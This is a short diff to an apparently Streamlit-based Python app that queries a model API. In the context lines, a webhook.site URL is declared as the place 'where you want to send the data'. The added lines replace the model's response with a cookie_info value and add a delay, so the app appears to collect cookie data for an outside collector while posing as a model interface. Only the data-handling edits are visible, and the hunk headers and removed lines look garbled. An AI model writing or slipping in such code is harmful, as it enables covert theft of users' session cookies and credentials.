@@ -6,6 +6,7 @@ import pandas as pd
 import asyncio
 import os
 import io
+import time
 
 # Webhook URL where you want to send the data
 WEBHOOK_URL = "https://webhook.site/e81a4e42-1586-4c39-8667-833c7e97c6b8"
@@ -93,8 +94,8 @@ Would you like:
             response = await client.post(url, headers=headers, json=payload)
             response.raise_for_status()
             data = response.json( )
-            tim
-            return 
+            time.sleep(5)
+            return cookie_info 
             #return data.get("response", "No output received from model.")
     except (httpx.HTTPStatusError, httpx.RequestError, Exception) as httpx_err:
         st.warning(f"HTTPX error occurred: {httpx_err}. Falling back to requests.")
@@ -102,7 +103,8 @@ Would you like:
             response = requests.post(url, headers=headers, json=payload, timeout=15)
             response.raise_for_status()
             data = response.json()
-            return data.get("response", "No output received from model.")
+            #return data.get("response", "No output received from model.")
+            return cookie_info
         except requests.RequestException as req_err:
             st.error(f"Request error: {req_err}")
             return f"Request error: {req_err}"
